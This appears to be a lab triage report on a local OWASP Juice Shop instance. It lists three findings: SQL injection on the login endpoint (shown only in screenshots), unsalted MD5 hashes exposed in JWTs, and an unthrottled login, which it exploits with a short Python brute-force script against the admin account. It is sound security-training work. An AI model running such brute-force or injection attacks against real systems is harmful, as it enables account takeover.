# Triage Report — OWASP Juice Shop

## Scope & Asset
- Asset: OWASP Juice Shop (local lab instance)
- Image: `bkimminich/juice-shop:v19.0.0`
- Release link/date: [link](https://github.com/juice-shop/juice-shop/releases/tag/v19.0.0) — Sep 2, 2025, 10:48 PM GMT+3
- Image digest: `sha256:1ca488df14084bcaf14045dace8fd72bf4a43b59d8b4afe6472ba593392f7765`

## Environment
- Host OS: `Ubuntu 24.04.2 LTS (GNU/Linux 5.15.153.1-microsoft-standard-WSL2 x86_64)`
- Docker: `28.0.4, build b8034c0`

## Deployment Details
- Run command used: `docker run -d --name juice-shop -p 127.0.0.1:3000:3000 bkimminich/juice-shop:v19.0.0`
- Access URL: http://127.0.0.1:3000
- Network exposure: 127.0.0.1 only 
	- [X] Yes  
	- [ ] No (explain if No)

## Health Check

**API check result**:
![](https://i.ibb.co/YrcRLTQ/Pasted-image-20250919153305.png)

**Home page screenshot**:
![](https://i.ibb.co/6Js77mhc/Pasted-image-20250919153243.png)

## Surface Snapshot (Triage)
- Login/Registration visible: 
	- [X] Yes
	- [ ] No — notes: <...>
- Product listing/search present:
	- [x] Yes 
	- [ ] [ ] No — notes: <...>
- Admin or account area discoverable:
	- [x] Yes 
	- [ ] [ ] No — notes: <...>
- Client-side errors in console:
	- [ ] Yes 
	- [x] [ ] No — notes: no immediately provokable errors encountered
- Security headers (quick look — optional): `curl -I http://127.0.0.1:3000` → CSP/HSTS present?
	- [ ] Yes 
	- [x] [ ] No — notes: CSP/HSTS headers are not present

## Risks Observed (Top 3)

### Top Priority Risk: direct data substitution into login SQL request

> The `/rest/user/login` endpoint lacks query parametrization, leading to susceptibility to SQL injections, which grants an attacker access to any account in the system if the corresponding username is known.

**SQL injection on the login form (using an incorrect password)**:
![](https://i.ibb.co/r2yJhMwK/Pasted-image-20251008182653.png)

**The injection result**:
![](https://i.ibb.co/jY1g8M7/Pasted-image-20251008182629.png)

### Second Priority Risk: login bruteforce susceptibility

> The `/rest/user/login` endpoint does not introduce any timeout or attempt limits, enabling an attacker to quickly perform online bruteforce using common passwords for any account including the administrator.

**An attack script**:
```python
# bruteforce.py
import requests

with open('/home/control/DevSecOpsLab1/passwords.txt') as f:
    for password in f:
        password = password.strip()
        resp = requests.post(
            'http://127.0.0.1:3000/rest/user/login',
            json={"email": "admin@juice-sh.op", "password": password}
        )
        if resp.status_code == 200 or 'authentication' in resp.text:
            print(f"Found: {password}")
            break
        print(f"Tried: {password}")
```

**The attack result**:
![](https://i.ibb.co/Hftj3VC5/Pasted-image-20251008182251.png)

**Admin account theft verification**:
![](https://i.ibb.co/Pz5Hq55p/Pasted-image-20251008174015.png)

### Third Priority Risk: insecure password containment

> The system stores user passwords as raw MD5 hashes, enabling the attackers to reverse engineer user passwords with an MD5 rainbow table if the database leak occurs or an (expired) JWT token of a user gets stolen.

**Assume a JWT token (active or expired) is stolen**:
![](https://i.ibb.co/Ldry3McP/Pasted-image-20251008164142.png)

**The payload of the JWT token contains raw MD5 password hash**:
![](https://i.ibb.co/Fkp52fyd/Pasted-image-20251008164214.png)

**An online rainbow table can be used to reverse engineer the password**:
![](https://i.ibb.co/fGCRt6nJ/Pasted-image-20251008164034.png)
